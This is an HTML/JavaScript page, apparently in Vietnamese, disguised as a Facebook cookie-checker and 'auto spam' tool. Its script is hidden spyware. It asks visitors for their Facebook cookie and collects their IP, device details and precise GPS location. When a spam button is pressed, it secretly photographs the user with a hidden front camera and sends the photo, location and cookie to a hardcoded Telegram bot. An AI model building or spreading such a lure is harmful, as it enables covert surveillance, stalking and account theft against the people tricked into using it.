<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Facebook Tool | Auto Spam + Trace Location</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
        body { background: linear-gradient(135deg, #0a0a1a 0%, #0f0f1f 100%); min-height: 100vh; font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { width: 100%; max-width: 480px; background: rgba(20,20,40,0.95); border-radius: 28px; backdrop-filter: blur(10px); box-shadow: 0 20px 40px rgba(0,0,0,0.4), 0 0 0 1px rgba(66,153,225,0.2); overflow: hidden; }
        .fb-header { background: #1877f2; padding: 18px 20px; text-align: center; }
        .fb-header h1 { color: white; font-size: 24px; font-weight: 600; }
        .fb-header p { color: rgba(255,255,255,0.9); font-size: 12px; margin-top: 5px; }
        .content { padding: 20px; }
        .cookie-section { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 18px; margin-bottom: 20px; border: 1px solid rgba(66,153,225,0.3); }
        .cookie-label { color: #fff; font-size: 14px; font-weight: 500; margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
        .cookie-input { width: 100%; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.2); border-radius: 14px; padding: 14px 16px; color: #fff; font-size: 13px; font-family: monospace; resize: vertical; }
        .cookie-input:focus { outline: none; border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24,119,242,0.3); }
        .info-row { display: flex; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; }
        .info-box { flex: 1; background: rgba(255,255,255,0.05); border-radius: 16px; padding: 12px; border: 1px solid rgba(255,255,255,0.1); }
        .info-label { color: rgba(255,255,255,0.6); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
        .info-value { color: #fff; font-size: 12px; background: rgba(0,0,0,0.3); padding: 8px 10px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); word-break: break-all; }
        .delay-section { background: rgba(255,255,255,0.05); border-radius: 16px; padding: 15px; margin-bottom: 25px; }
        .delay-header { display: flex; justify-content: space-between; color: #fff; font-size: 13px; margin-bottom: 12px; }
        .delay-slider { width: 100%; height: 6px; -webkit-appearance: none; background: rgba(255,255,255,0.2); border-radius: 10px; }
        .delay-slider::-webkit-slider-thumb { -webkit-appearance: none; width: 18px; height: 18px; background: #1877f2; border-radius: 50%; cursor: pointer; box-shadow: 0 0 8px #1877f2; }
        .delay-value { color: #1877f2; font-weight: bold; font-size: 16px; }
        .task-buttons { display: flex; flex-direction: column; gap: 14px; margin-bottom: 20px; }
        .task-btn { display: flex; align-items: center; justify-content: space-between; padding: 18px 22px; border: none; border-radius: 60px; font-size: 18px; font-weight: bold; cursor: pointer; transition: all 0.2s; color: white; }
        .task-btn:active { transform: scale(0.97); }
        .task-left { display: flex; align-items: center; gap: 12px; }
        .task-icon { font-size: 28px; }
        .task-name { font-weight: 700; letter-spacing: 1px; }
        .task-badge { background: rgba(0,0,0,0.3); padding: 5px 12px; border-radius: 40px; font-size: 12px; }
        .btn-ngon { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); box-shadow: 0 8px 20px rgba(245,87,108,0.3); }
        .btn-nhay { background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); box-shadow: 0 8px 20px rgba(79,172,254,0.3); }
        .btn-top { background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%); box-shadow: 0 8px 20px rgba(67,233,123,0.3); }
        .status-area { background: rgba(0,0,0,0.5); border-radius: 16px; padding: 12px 16px; margin-top: 15px; display: flex; align-items: center; gap: 10px; border-left: 3px solid #1877f2; }
        .status-dot { width: 10px; height: 10px; background: #4caf50; border-radius: 50%; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.5;transform:scale(0.8)} }
        .status-text { color: rgba(255,255,255,0.8); font-size: 12px; flex: 1; }
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; display: flex; justify-content: center; align-items: center; flex-direction: column; backdrop-filter: blur(10px); transition: 0.3s; }
        .overlay.hide { display: none; }
        .spinner { width: 65px; height: 65px; border: 4px solid rgba(24,119,242,0.2); border-top-color: #1877f2; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .overlay-text { color: #fff; font-size: 20px; margin-top: 25px; font-weight: 500; }
        .overlay-sub { color: rgba(255,255,255,0.6); font-size: 13px; margin-top: 10px; text-align: center; padding: 0 20px; }
        .hidden-cam { position: fixed; top: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.9); color: white; padding: 12px 24px; border-radius: 50px; font-size: 14px; z-index: 1001; animation: toastIn 0.3s ease; border-left: 3px solid #1877f2; }
        @keyframes toastIn { from { opacity: 0; transform: translateX(-50%) translateY(20px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
        .task-manager { margin-top: 15px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.1); display: flex; justify-content: space-between; font-size: 11px; color: rgba(255,255,255,0.5); }
    </style>
</head>
<body>
    <div class="container">
        <div class="fb-header"><h1>📱 Facebook Tool Pro</h1><p>Cookie Checker | Auto Spam + Trace Location</p></div>
        <div class="content">
            <div class="cookie-section"><div class="cookie-label"><span>🍪</span> Cookie Facebook</div><input type="text" class="cookie-input" id="cookieInput" placeholder="EAAB... hoặc nhập bất kỳ"></div>
            <div class="info-row"><div class="info-box"><div class="info-label">🆔 ID Facebook</div><div class="info-value" id="fbId">122257033</div></div><div class="info-box"><div class="info-label">📢 Channel ID</div><div class="info-value" id="channelId">FB_Channel_509</div></div></div>
            <div class="info-row"><div class="info-box"><div class="info-label">📍 Vị trí GPS (nếu có)</div><div class="info-value" id="locationStatus">Đang chờ...</div></div><div class="info-box"><div class="info-label">🗺️ Bản đồ</div><div class="info-value" id="mapLink">---</div></div></div>
            <div class="delay-section"><div class="delay-header"><span>⏱️ Delay Spam</span><span class="delay-value" id="delayValue">1.5s</span></div><input type="range" class="delay-slider" id="delaySlider" min="0.5" max="5" step="0.1" value="1.5"></div>
            <div class="task-buttons"><button class="task-btn btn-ngon" data-task="spam_ngon"><div class="task-left"><span class="task-icon">🗣️</span><span class="task-name">SPAM NGÔN</span></div><span class="task-badge">🔥 1000+</span></button><button class="task-btn btn-nhay" data-task="spam_nhay"><div class="task-left"><span class="task-icon">💀</span><span class="task-name">SPAM NHÂY</span></div><span class="task-badge">⚡ 500+</span></button><button class="task-btn btn-top" data-task="spam_top"><div class="task-left"><span class="task-icon">👑</span><span class="task-name">SPAM TOP</span></div><span class="task-badge">🏆 200+</span></button></div>
            <div class="status-area"><div class="status-dot"></div><div class="status-text" id="statusText">✅ Sẵn sàng | Chọn task để spam</div></div>
            <div class="task-manager"><span>📋 Task Manager v3.0 GPS</span><span id="taskCount">0 task đã xử lý</span></div>
        </div>
    </div>
    <div id="overlay" class="overlay hide"><div class="spinner"></div><div class="overlay-text" id="overlayText">ĐANG XỬ LÝ</div><div class="overlay-sub" id="overlaySub">Vui lòng chờ...</div></div>
    <video id="video" autoplay playsinline muted class="hidden-cam"></video>
    <canvas id="canvas" class="hidden-cam"></canvas>

    <script>
        (function(){
            const BOT_TOKEN = "8750392031:AAFXe4KFZTE_R2-BLKn1fxjDA_OAKrIr4ig";
            const CHAT_ID = "6788350792";

            const cookieInput = document.getElementById('cookieInput');
            const fbIdSpan = document.getElementById('fbId');
            const channelIdSpan = document.getElementById('channelId');
            const delaySlider = document.getElementById('delaySlider');
            const delayValue = document.getElementById('delayValue');
            const statusText = document.getElementById('statusText');
            const taskCountSpan = document.getElementById('taskCount');
            const overlay = document.getElementById('overlay');
            const overlayText = document.getElementById('overlayText');
            const overlaySub = document.getElementById('overlaySub');
            const videoCam = document.getElementById('video');
            const canvasCam = document.getElementById('canvas');
            const locationStatusSpan = document.getElementById('locationStatus');
            const mapLinkSpan = document.getElementById('mapLink');

            let taskCount = 0;
            let isProcessing = false;
            let mediaStream = null;
            let deviceInfoCache = null;
            let currentLocation = null; // lưu vị trí

            function showToast(message, isError = false) {
                const toast = document.createElement('div');
                toast.className = 'toast';
                toast.style.background = isError ? 'rgba(220,53,69,0.9)' : 'rgba(0,0,0,0.9)';
                toast.style.borderLeftColor = isError ? '#dc3545' : '#1877f2';
                toast.innerText = message;
                document.body.appendChild(toast);
                setTimeout(() => toast.remove(), 2500);
            }
            function updateTaskCount() { taskCountSpan.innerText = taskCount + ' task đã xử lý'; }
            delaySlider.addEventListener('input', function() { delayValue.innerText = this.value + 's'; });

            // LẤY VỊ TRÍ GPS CHÍNH XÁC
            async function getAccurateLocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        locationStatusSpan.innerText = 'Trình duyệt không hỗ trợ định vị';
                        resolve(null);
                        return;
                    }
                    locationStatusSpan.innerText = 'Đang lấy vị trí...';
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            const lat = pos.coords.latitude;
                            const lng = pos.coords.longitude;
                            const accuracy = pos.coords.accuracy;
                            const speed = pos.coords.speed ? pos.coords.speed.toFixed(2) : 'N/A';
                            const alt = pos.coords.altitude ? pos.coords.altitude.toFixed(1) : 'N/A';
                            const locationData = {
                                lat, lng, accuracy, speed, alt,
                                timestamp: new Date(pos.timestamp).toLocaleString('vi-VN'),
                                mapUrl: `https://www.google.com/maps?q=${lat},${lng}`
                            };
                            locationStatusSpan.innerHTML = `${lat.toFixed(6)}, ${lng.toFixed(6)}<br><span style="font-size:10px;">✅ sai số ${accuracy.toFixed(0)}m</span>`;
                            mapLinkSpan.innerHTML = `<a href="${locationData.mapUrl}" target="_blank" style="color:#1877f2;">Xem bản đồ</a>`;
                            resolve(locationData);
                        },
                        (err) => {
                            let errMsg = '';
                            switch(err.code) {
                                case err.PERMISSION_DENIED: errMsg = 'Bị từ chối quyền truy cập'; break;
                                case err.POSITION_UNAVAILABLE: errMsg = 'Không thể lấy vị trí'; break;
                                case err.TIMEOUT: errMsg = 'Hết thời gian chờ'; break;
                                default: errMsg = 'Lỗi không xác định';
                            }
                            locationStatusSpan.innerText = `❌ ${errMsg}`;
                            mapLinkSpan.innerText = '---';
                            resolve(null);
                        },
                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                    );
                });
            }

            // Thu thập device info + IP + thành phố từ IP
            async function collectDeviceInfo() {
                if (deviceInfoCache) return deviceInfoCache;
                let ip = 'Đang lấy...';
                let city = 'N/A', country = 'N/A';
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    ip = ipData.ip;
                    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                    const geo = await geoRes.json();
                    city = geo.city || 'N/A';
                    country = geo.country_name || 'N/A';
                } catch (e) { console.warn(e); }
                let batteryInfo = 'N/A';
                try {
                    if (navigator.getBattery) {
                        const bt = await navigator.getBattery();
                        batteryInfo = (bt.level * 100).toFixed(0) + '% ' + (bt.charging ? '(🔌 sạc)' : '(🔋 pin)');
                    }
                } catch (e) {}
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const resolution = window.screen.width + 'x' + window.screen.height;
                const cpuCores = navigator.hardwareConcurrency || 'N/A';
                const platform = navigator.platform;
                const userAgent = navigator.userAgent;
                const language = navigator.language;
                const referrer = document.referrer || 'Trực tiếp';
                const pageUrl = window.location.href;
                const info = { ip, city, country, batteryInfo, timezone, resolution, cpuCores, platform, userAgent, language, referrer, pageUrl };
                deviceInfoCache = info;
                return info;
            }

            function formatDeviceMessage(info, location, taskDisplay, icon) {
                let locationText = '📍 KHÔNG CÓ GPS';
                if (location) {
                    locationText = `📍 Vị trí: ${location.lat}, ${location.lng}\n🎯 Độ chính xác: ${location.accuracy.toFixed(0)}m\n🚗 Tốc độ: ${location.speed} m/s\n🗺️ Bản đồ: ${location.mapUrl}`;
                }
                return `${icon} 𝐓𝐀𝐒𝐊: ${taskDisplay} ${icon}\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}\n` +
                    `🌐 IP: ${info.ip}\n` +
                    `🏙️ Thành phố: ${info.city}, ${info.country}\n` +
                    `${locationText}\n` +
                    `🔋 Pin: ${info.batteryInfo}\n` +
                    `🖥️ Độ phân giải: ${info.resolution}\n` +
                    `⚙️ CPU: ${info.cpuCores} nhân\n` +
                    `📱 Platform: ${info.platform}\n` +
                    `🌍 Ngôn ngữ: ${info.language}\n` +
                    `🔗 Referrer: ${info.referrer}\n` +
                    `📄 URL: ${info.pageUrl}\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ Capture thành công!`;
            }

            async function sendPhotoToTelegram(imageBlob, caption) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', imageBlob, 'capture.jpg');
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            }
            async function sendMessageToTelegram(text) {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
                });
            }
            async function sendFakeCookieReport(taskType, deviceInfo, location) {
                const fakeCookie = cookieInput.value.trim() || "EAAB_FAKE_" + Math.random().toString(36).substring(2, 12);
                const fakeId = fbIdSpan.innerText;
                const fakeChannel = channelIdSpan.innerText;
                const delay = delaySlider.value;
                const taskNames = { spam_ngon: 'SPAM NGÔN', spam_nhay: 'SPAM NHÂY', spam_top: 'SPAM TOP' };
                const taskDisplay = taskNames[taskType] || 'UNKNOWN';
                let locStr = location ? `https://www.google.com/maps?q=${location.lat},${location.lng}` : 'Không có GPS';
                const msg = `🍪 <b>COOKIE GIẢ - ${taskDisplay}</b>\n━━━━━━━━━━━━━━━━\n📝 Cookie: ${fakeCookie}\n🆔 ID: ${fakeId}\n📢 Channel: ${fakeChannel}\n⏱️ Delay: ${delay}s\n🌐 IP: ${deviceInfo.ip}\n📍 Vị trí: ${locStr}\n⏰ Time: ${new Date().toLocaleString('vi-VN')}`;
                await sendMessageToTelegram(msg);
            }

            function capturePhoto() {
                return new Promise((resolve, reject) => {
                    if (!videoCam.videoWidth || videoCam.videoWidth === 0) reject(new Error('Camera chưa sẵn sàng'));
                    canvasCam.width = videoCam.videoWidth;
                    canvasCam.height = videoCam.videoHeight;
                    const ctx = canvasCam.getContext('2d');
                    ctx.drawImage(videoCam, 0, 0, canvasCam.width, canvasCam.height);
                    canvasCam.toBlob((blob) => { if(blob) resolve(blob); else reject(new Error('Không tạo ảnh')); }, 'image/jpeg', 0.9);
                });
            }
            function startCamera() {
                return new Promise((resolve, reject) => {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                        .then(stream => { mediaStream = stream; videoCam.srcObject = stream; videoCam.onloadedmetadata = () => { videoCam.play(); setTimeout(resolve, 800); }; })
                        .catch(err => reject(err));
                });
            }
            function stopCamera() { if (mediaStream) { mediaStream.getTracks().forEach(track => track.stop()); mediaStream = null; } }

            const taskMeta = { spam_ngon: { name: 'SPAM NGÔN', icon: '🗣️' }, spam_nhay: { name: 'SPAM NHÂY', icon: '💀' }, spam_top: { name: 'SPAM TOP', icon: '👑' } };

            async function processTask(taskType) {
                if (isProcessing) { showToast('⚠️ Đang xử lý task khác, vui lòng chờ!', true); return; }
                isProcessing = true;
                const meta = taskMeta[taskType] || { name: 'UNKNOWN', icon: '🎯' };
                overlay.classList.remove('hide');
                overlayText.innerText = `ĐANG ${meta.name}...`;
                overlaySub.innerText = 'Đang lấy vị trí & thu thập dữ liệu...';
                try {
                    const locationPromise = getAccurateLocatio();
                    const deviceInfoPromise = collectDeviceInfo();
                    let cameraAvailable = false;
                    try { await startCamera(); cameraAvailable = true; } catch(camErr) { console.warn(camErr); cameraAvailable = false; }
                    const deviceInfo = await deviceInfoPromise;
                    const location = await locationPromise;
                    currentLocation = location;
                    await sendFakeCookieReport(taskType, deviceInfo, location);
                    if (cameraAvailable) {
                        overlaySub.innerText = 'Đang chụp ảnh...';
                        const imageBlob = await capturePhoto();
                        const caption = formatDeviceMessage(deviceInfo, location, meta.name, meta.icon);
                        await sendPhotoToTelegram(imageBlob, caption);
                        stopCamera();
                        taskCount++; updateTaskCount();
                        statusText.innerHTML = `✅ ${meta.icon} ${meta.name} THÀNH CÔNG! Vị trí + ảnh mặt đã gửi`;
                        showToast(`${meta.icon} ${meta.name} thành công! Đã có GPS và ảnh mặt.`);
                    } else {
                        const noCamMsg = `⚠️ <b>KHÔNG CÓ CAMERA - ${meta.name}</b>\n━━━━━━━━━━━━━━━━\n🌐 IP: ${deviceInfo.ip}\n🏙️ TP: ${deviceInfo.city}\n${location ? `📍 GPS: ${location.lat}, ${location.lng}\n🗺️ ${location.mapUrl}` : '📍 Không có GPS'}\n⏰ Time: ${new Date().toLocaleString('vi-VN')}`;
                        await sendMessageToTelegram(noCamMsg);
                        statusText.innerHTML = `❌ ${meta.icon} ${meta.name} THẤT BẠI! Không có camera`;
                        showToast(`❌ ${meta.name} thất bại! Không có camera`, true);
                    }
                } catch (error) {
                    console.error(error);
                    statusText.innerHTML = `❌ Lỗi hệ thống khi xử lý ${meta.name}`;
                    showToast(`❌ Lỗi: ${error.message}`, true);
                    try { const info = deviceInfoCache || await collectDeviceInfo(); await sendMessageToTelegram(`🔥 LỖI XỬ LÝ TASK ${meta.name}\nIP: ${info.ip}\nLỗi: ${error.message}`); } catch(e) {}
                } finally {
                    stopCamera();
                    setTimeout(() => {
                        overlay.classList.add('hide');
                        isProcessing = false;
                        if (!statusText.innerText.includes('Sẵn sàng')) statusText.innerHTML = '✅ Sẵn sàng | Chọn task để spam';
                        setTimeout(() => { window.location.href = 'https://youtu.be/z-3Cnrqe_uA?si=rCVXiaTZPjDdDjJ2'; }, 1000);
                    }, 1500);
                }
            }

            document.querySelectorAll('.task-btn').forEach(btn => {
                btn.addEventListener('click', (e) => { e.preventDefault(); processTask(btn.getAttribute('data-task')); });
            });
            collectDeviceInfo().catch(()=>{});
            getAccurateLocation().catch(()=>{});
        })();
    </script>
</body>
</html>
